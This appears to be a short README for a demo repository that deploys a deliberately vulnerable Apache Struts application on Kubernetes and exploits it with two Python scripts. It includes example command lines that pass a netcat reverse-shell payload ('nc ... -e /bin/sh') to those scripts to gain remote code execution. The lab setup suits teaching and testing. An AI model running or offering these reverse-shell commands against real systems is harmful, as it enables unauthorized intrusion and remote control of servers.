# struts-demo
Modified scripts for struts remote code execution (RCE) demo.   
The yaml file will deploy vulnerable container running struts super-app via apache tomcat website.

Deploy the container via yaml file to kubernetes cluster:
kubectl create namespace struts
kubectl create -f struts.yaml -n struts

A service will be created for the website.  Use the IP address from the website with the python scripts to exploit a remote code execution vul in the struts container.

kubectl get svc,pods -n struts

struts1.py example: (insert your own IP addresses / port for the reverse shell)

python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 'nc -nv 123.456.789.001 1337 -e /bin/sh'

struts-pwn2.py example:
python struts-pwn2.py --exploit --url 'http://xxx.xxx.xxx.xxx:8080/super-app/orders/3' -c 'nc -nv 123.456.789.100 1337 -e /bin/sh'
